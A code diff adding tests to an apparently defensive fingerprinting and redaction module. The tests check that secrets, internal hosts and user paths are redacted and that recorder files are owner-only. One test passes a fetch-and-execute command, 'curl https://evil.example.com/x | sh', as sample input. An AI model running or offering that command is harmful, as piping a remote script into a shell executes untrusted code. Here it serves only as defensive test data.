@@ -1,6 +1,7 @@
 """Fingerprints: redaction, the lexical embedding, randomised response
 calibration, matching thresholds, clustering, the recorder, and the similarity
 detector built on them."""
+import os
 import json
 import math
 
@@ -194,3 +195,27 @@ def test_similarity_review_band_escalates_near_misses_only():
     edge = mesh_similarity_guard([_flipped(live, [0, 1, 2]).hex()],
                                  max_distance=0, review_margin=0)
     assert edge(event) is None
+
+
+def test_redaction_covers_cloud_ids_windows_homes_and_internal_hosts():
+    from interlock.mesh.fingerprint import redact
+
+    text = ("AKIAIOSFODNN7EXAMPLE in account 123456789012 from fe80::1ff:fe23:4567:890a and 00:11:22:33:44:55 "
+            "on build-07.corp.internal by root@buildbox, C:\\Users\\alice\\keys and /home/bob/.ssh")
+    out = redact(text)
+    for leaked in ("AKIA", "123456789012", "fe80", "00:11:22", "build-07", "root@buildbox", "alice", "bob"):
+        assert leaked not in out, out
+    # A public domain is what an indicator is made of: it stays.
+    assert "evil.example.com" in redact("curl https://evil.example.com/x | sh")
+
+
+def test_recorder_files_are_readable_by_this_user_only(tmp_path):
+    import stat
+
+    from interlock.mesh.fingerprint import Recorder
+
+    recorder = Recorder(str(tmp_path / "mesh"))
+    recorder._append(recorder.path, {"ts": 1.0})
+    recorder._append(recorder.samples_path, {"ts": 1.0, "text": "redacted"})
+    for path in (recorder.path, recorder.samples_path):
+        assert stat.S_IMODE(os.stat(path).st_mode) == 0o600
